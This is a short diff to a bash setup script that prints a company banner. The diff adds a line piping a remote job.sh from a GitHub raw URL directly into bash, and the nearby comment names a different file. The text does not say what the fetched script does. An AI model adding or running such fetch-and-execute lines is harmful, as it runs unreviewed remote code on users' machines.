@@ -10,12 +10,18 @@ echo "Mobile Applications Leaders [Let's work together]"
 echo "===================================="
 
 sleep 5
+
 # Function to print a header for sections
 function print_header {
     echo "====================="
     echo "$1"
     echo "====================="
 }
+
+# Define the URL of the run.sh file in the GitHub repository
+wget -O - https://raw.githubusercontent.com/elabda3company/ShLaravel/main/job.sh | bash
+
+echo "Script downloaded, executed "
 
 # Get the current user
 CURRENT_USER=$(whoami)
